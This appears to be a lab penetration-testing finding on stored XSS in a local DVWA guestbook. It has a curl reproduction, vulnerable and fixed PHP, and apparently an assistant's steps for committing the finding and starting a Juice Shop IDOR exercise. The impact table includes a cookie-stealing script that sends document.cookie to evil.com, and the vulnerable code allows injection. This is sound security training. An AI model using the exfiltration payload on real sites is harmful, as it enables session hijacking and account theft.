# F02: Stored Cross-Site Scripting (XSS)

## OWASP Category
**A03: Injection**

## Target Application
- **URL**: http://localhost:8085/vulnerabilities/xss_s/
- **Security Level**: Low
- **Vulnerable Parameter**: Message field

## Proof of Concept

### Test Input
| Field | Value |
|-------|-------|
| Name | `test` |
| Message | `<script>alert(1)</script>` |

### Steps to Reproduce
1. Navigate to **XSS (Stored)** page
2. Enter any name (e.g., "test")
3. Enter payload `<script>alert(1)</script>` in the Message field
4. Click **"Sign Guestbook"**
5. Alert popup appears immediately

### Expected Result
A JavaScript alert box displays the number "1", confirming successful XSS execution.

## Evidence

### Screenshot
![XSS Alert](xss-alert.png)

### HTTP Request (Captured)
```http
POST /vulnerabilities/xss_s/ HTTP/1.1
Host: localhost:8085
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=YOUR_SESSION_ID; security=low

cURL Command
bash

curl -X POST "http://localhost:8085/vulnerabilities/xss_s/" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID; security=low" \
  -d "txtName=test&txtMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook"

Root Cause Analysis
Vulnerable Code

// Storing user input without sanitization
$name = $_POST['txtName'];
$message = $_POST['txtMessage'];
$query = "INSERT INTO guestbook (name, comment) VALUES ('$name', '$message')";

// Displaying without HTML encoding
echo "<p>Name: " . $row['name'] . "</p>";
echo "<p>Message: " . $row['comment'] . "</p>";

Content-Length: 45

txtName=test&txtMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook

Why It's Vulnerable

    No input sanitization: Special characters like <, >, quotes are not filtered

    No output encoding: User input is rendered directly as HTML

    No Content Security Policy (CSP): Inline scripts are allowed to execute

Business Impact for Meridian FinServe

If this vulnerability existed in the customer portal:
Impact	Description
Session Hijacking	Attacker steals admin cookies: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
Credential Theft	Fake login form injected into the portal
Defacement	Portal appearance modified to damage brand reputation
Malware Distribution	Users redirected to malicious sites
Regulatory Fines	RBI data protection violations - up to ₹5 crore
Customer Churn	Loss of trust in the NBFC's security posture
Remediation
Code Fix - Secure Version
// When storing - use prepared statements
$stmt = $conn->prepare("INSERT INTO guestbook (name, comment) VALUES (?, ?)");
$stmt->bind_param("ss", $name, $message);
$stmt->execute();

// When displaying - HTML encode the output
echo "<p>Name: " . htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8') . "</p>";
echo "<p>Message: " . htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8') . "</p>";

Additional Defense Layers
Layer	Control	Effort	Trade-off
Application	htmlspecialchars() on all output	S	None - zero performance impact
Application	Content Security Policy header	M	Blocks inline scripts - may break some features
WAF	XSS detection rules	M	Possible false positives
Monitoring	Alert on script tags in forms	S	Log volume increase
Implementation Effort: Small (2-4 hours)

    Add htmlspecialchars() to all user-supplied output

    Add CSP header in web server configuration

    Update all display functions in the codebase

Why This Fix Works
Fix	How It Prevents XSS
htmlspecialchars()	Converts <script> to &lt;script&gt; - browser shows as text, not executable
ENT_QUOTES	Converts both single and double quotes, preventing attribute-based XSS
UTF-8	Prevents encoding bypass attacks
Prepared statements	Prevents SQL injection alongside XSS
References

    OWASP: Cross-Site Scripting (XSS)

    OWASP XSS Prevention Cheat Sheet

    PHP htmlspecialchars() Documentation

    CWE-79: Improper Neutralization of Input During Web Page Generation

Verification After Fix

After applying the fix, the payload <script>alert(1)</script> should display as plain text instead of executing.


### Step 3: Upload your screenshot

1. Click **"Add file"** → **"Upload files"**
2. Upload your screenshot (`Screenshot From 2026-06-04 10-51-33.png`)
3. Rename it to `xss-alert.png` (or keep the original name)
4. Update the README.md to reference your screenshot filename

### Step 4: Commit the file

1. Commit message: `feat(webapp): add stored XSS finding F02 with screenshot`
2. Select "Commit directly to the main branch"
3. Click "Commit new file"

---

## ✅ Progress So Far

| Finding | Vulnerability | Status |
|---------|---------------|--------|
| F01 | SQL Injection | ✅ Created |
| F02 | Stored XSS | ✅ Just created |

---

## 🎯 Next Vulnerability: IDOR (Insecure Direct Object Reference)

**Target**: Juice Shop (http://localhost:3001)

**What we'll do**: Access another user's shopping basket by changing the ID in the URL

**Ready for the next one?** Let me know and I'll guide you through finding IDOR in Juice Shop!
